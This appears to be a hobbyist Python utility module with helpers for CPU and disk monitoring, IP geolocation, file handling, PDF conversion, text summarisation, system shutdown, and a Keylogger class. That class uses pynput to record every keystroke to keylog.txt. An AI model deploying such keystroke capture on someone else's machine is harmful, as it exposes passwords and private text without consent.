import platform
import json
import csv
import geocoder
import psutil
import os
from pynput import keyboard
import time
from pdf2docx import Converter
import json
from transformers import pipeline
import re
from sumy.parsers.plaintext import PlaintextParser
from sumy.nlp.tokenizers import Tokenizer
from sumy.summarizers.lsa import LsaSummarizer  

# for print
class Content:    
    @staticmethod
    def show(text):
        print(text)
  
# for monitor system permonce
class System:   
    @staticmethod
    def cpu(format=None):
        cpu_usage = psutil.cpu_percent(interval=1)
        return System._format("CPU_Usage", cpu_usage, format)

    @staticmethod
    def storage(format=None):
        storage = psutil.disk_usage('/')
        storage_info = {
            "Total": f"{storage.total / (1024 ** 3):.2f} GB",
            "Used": f"{storage.used / (1024 ** 3):.2f} GB",
            "Free": f"{storage.free / (1024 ** 3):.2f} GB"
        }
        return System._format("storage", storage_info, format)

    @staticmethod
    def All(format=None):
        cpu_info = System.cpu(format)
        storage_info = System.storage(format)
        all_info = {
            "storage": json.loads(storage_info),
            "cpu": json.loads(cpu_info)
        }
        return System._format("all_performance", all_info, format)

    @staticmethod
    def _format(label, value, format):
        if format == 'json':
            return json.dumps({label: value}, indent=4)
        elif format == 'yaml':
            try:
                import yaml
                return yaml.dump({label: value}, default_flow_style=False)
            except ImportError:
                return f"YAML formatting not available. {label}: {value}"
        else:
            return f"{label}: {value}"

    @staticmethod
    def save(filename, *contents, append=False):
        if append and os.path.exists(filename):
            # Read the existing content and append new data
            with open(filename, 'r') as file:
                try:
                    existing_data = json.load(file)
                except json.JSONDecodeError:
                    # If the file is empty or not a valid JSON, start with an empty list
                    existing_data = []
        else:
            # Start a new list if the file does not exist or we are not appending
            existing_data = []

        # Combine new content
        new_data = System._combine_contents(*contents)
        combined_data = existing_data + [json.loads(new_data)]

        # Write the combined data to the file
        with open(filename, 'w') as file:
            json.dump(combined_data, file, indent=4)

    @staticmethod
    def _combine_contents(*contents):
        combined = {}
        for content in contents:
            if isinstance(content, str):
                try:
                    # Attempt to parse JSON content and update the combined dictionary
                    parsed_content = json.loads(content)
                    combined.update(parsed_content)
                except json.JSONDecodeError:
                    # If parsing fails, fall back to raw content
                    combined['result'] = content
            else:
                raise ValueError("All contents must be strings")
        return json.dumps(combined, indent=4)
    
#for see own location 
def get_location(format='default'):
    g = geocoder.ip('me')
    location = g.json
    
    if format == 'default':
        return location
    elif format == 'formatted':
        return (
            f"City: {location.get('city', 'N/A')}\n"
            f"State: {location.get('state', 'N/A')}\n"
            f"Country: {location.get('country', 'N/A')}\n"
            f"Latitude: {location.get('lat', 'N/A')}\n"
            f"Longitude: {location.get('lng', 'N/A')}"
        )
    elif format == 'json':
        import json
        return json.dumps(location, indent=4)
    else:
        return "Unknown format"
    #locations_json = get_location(format='json')

#keylogger use keylogger(activate=True)
class Keylogger:
    def __init__(self, activate=True):
        self.activate = activate
        self.log_file = "keylog.txt"
        self.listener = None
        self.log = ""

    def on_press(self, key):
        try:
            self.log += key.char
        except AttributeError:
            if key == keyboard.Key.enter:
                self.log += "[Key.enter]"
            elif key == keyboard.Key.tab:
                self.log += "[Key.tab]"
            elif key == keyboard.Key.space:
                self.log += "[Key.space]"
            elif key == keyboard.Key.backspace:
                self.log += "[Key.backspace]"
            elif key == keyboard.Key.ctrl_l:
                self.log += "[Key.ctrl_l]"
            elif key == keyboard.Key.shift:
                self.log += "[Key.shift]"
            elif key == keyboard.Key.alt:
                self.log += "[Key.alt]"
            else:
                self.log += f"[{key}]"

        with open(self.log_file, "w") as file:
            file.write(self.log)

    def start(self):
        if self.activate:
            print("Keylogger activated.")
            self.listener = keyboard.Listener(on_press=self.on_press)
            self.listener.start()
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                self.listener.stop()
                print("Keylogger stopped.")
        else:
            print("Keylogger not activated.")
def keylogger(activate=True):
    kl = Keylogger(activate)
    kl.start()

#for shutdown computer ==> computer(shutdown=True). for restart computer(restart=true)
class SystemControl:
    def __init__(self, restart=False, shutdown=False):
        self.restart = restart
        self.shutdown = shutdown

    def execute(self):
        if platform.system() == "Windows":
            if self.restart:
                os.system("shutdown /r /t 1")  # Restart Windows
            elif self.shutdown:
                os.system("shutdown /s /t 1")  # Shutdown Windows
        elif platform.system() == "Linux" or platform.system() == "Darwin":
            if self.restart:
                os.system("sudo reboot")  # Restart Linux/macOS
            elif self.shutdown:
                os.system("sudo shutdown now")  # Shutdown Linux/macOS
        else:
            raise OSError("Unsupported OS")
def system_control(restart=False, shutdown=False):
    sc = SystemControl(restart, shutdown)
    sc.execute()

"""HOT TO USE
file_manager.create(file_type='txt', activity='write', file_name='example')"""
class FileManager:
    def __init__(self):
        self.file_extension_map = {
            'txt': '.txt',
            'json': '.json',
            'csv': '.csv',
            'html': '.html',
            'css': '.css',
            'py': '.py'
        }

    def create(self, file_name: str, file_type: str, activity: str, content=None):
        # Get file extension
        extension = self.file_extension_map.get(file_type.lower(), None)
        if not extension:
            raise ValueError(f"Unsupported file type: {file_type}")

        full_file_name = f"{file_name}{extension}"

        if activity == "write":
            self._write(full_file_name, content)
        elif activity == "read":
            return self._read(full_file_name)
        elif activity == "append":
            self._append(full_file_name, content)
        elif activity == "read_and_append":
            current_content = self._read(full_file_name)
            self._append(full_file_name, content)
            return current_content
        elif activity == "write_and_read":
            self._write(full_file_name, content)
            return self._read(full_file_name)
        else:
            raise ValueError(f"Unsupported activity: {activity}")

    def _write(self, file_name, content):
        if file_name.endswith(".json"):
            with open(file_name, 'w') as file:
                json.dump(content, file, indent=4)
        elif file_name.endswith(".csv"):
            if isinstance(content, list):
                with open(file_name, 'w', newline='') as file:
                    writer = csv.writer(file)
                    writer.writerows(content)
            else:
                raise ValueError("CSV content must be a list of rows")
        else:
            with open(file_name, 'w') as file:
                file.write(str(content))

    def _read(self, file_name):
        if not os.path.exists(file_name):
            raise FileNotFoundError(f"{file_name} does not exist")
        
        if file_name.endswith(".json"):
            with open(file_name, 'r') as file:
                return json.load(file)
        elif file_name.endswith(".csv"):
            with open(file_name, 'r') as file:
                reader = csv.reader(file)
                return list(reader)
        else:
            with open(file_name, 'r') as file:
                return file.read()

    def _append(self, file_name, content):
        if file_name.endswith(".json"):
            raise ValueError("Appending is not supported for JSON files")
        elif file_name.endswith(".csv"):
            if isinstance(content, list):
                with open(file_name, 'a', newline='') as file:
                    writer = csv.writer(file)
                    writer.writerows(content)
            else:
                raise ValueError("CSV content must be a list of rows")
        else:
            with open(file_name, 'a') as file:
                file.write(str(content))

"""HOW TO USE
pdf_file = 'example.pdf'  # Make sure you have this PDF file
word_file = 'converted_example.docx'
pdf_converter.convert(pdf_file, word_file)"""
class PdfToWordConverter:
    def convert(self, pdf_file: str, word_file: str):
        # Check if the PDF file exists
        if not os.path.exists(pdf_file):
            raise FileNotFoundError(f"{pdf_file} does not exist.")
        
        # Perform the conversion
        try:
            cv = Converter(pdf_file)
            cv.convert(word_file, start=0, end=None)
            cv.close()
            print(f"Successfully converted {pdf_file} to {word_file}")
        except Exception as e:
            raise RuntimeError(f"Error during conversion: {e}")

"""HOW TO USE
splitter.split(content, output_file='output.txt')f"""
class SentenceSplitter:
    def split(self, content: str, output_file: str):
        # Use regular expressions to split the content into sentences
        sentences = re.split(r'(?<=[.!?]) +', content.strip())

        # Save the sentences to the specified output file
        with open(output_file, 'w') as file:
            for sentence in sentences:
                file.write(sentence + '\n')
"""HOE TO USE
generator = ConclusionGenerator()
conclusion = generator.generate_conclusion(content, sentence_count=2)
print("Conclusion:", conclusion)"""    
class ConclusionGenerator:
    def generate_conclusion(self, text: str, sentence_count: int = 2) -> str:
        # Parse the text
        parser = PlaintextParser.from_string(text, Tokenizer("english"))
        
        # Initialize the LSA Summarizer
        summarizer = LsaSummarizer()
        
        # Summarize the text
        summary = summarizer(parser.document, sentence_count)
        
        # Generate the conclusion as a single string
        conclusion = " ".join(str(sentence) for sentence in summary)
        
        return conclusion

"""how to use
command_summary = summary_generator.generate_command_summary(content)"""
class UserCommandSummary:
    def __init__(self):
        # Initialize the summarization pipeline
        self.summarizer = pipeline("summarization")

    def generate_command_summary(self, text: str) -> str:
        # Generate a summary
        summary = self.summarizer(text, max_length=50, min_length=25, do_sample=False)

        # Format the summary as a command
        command = f"Summary: {summary[0]['summary_text']}"
        
        return command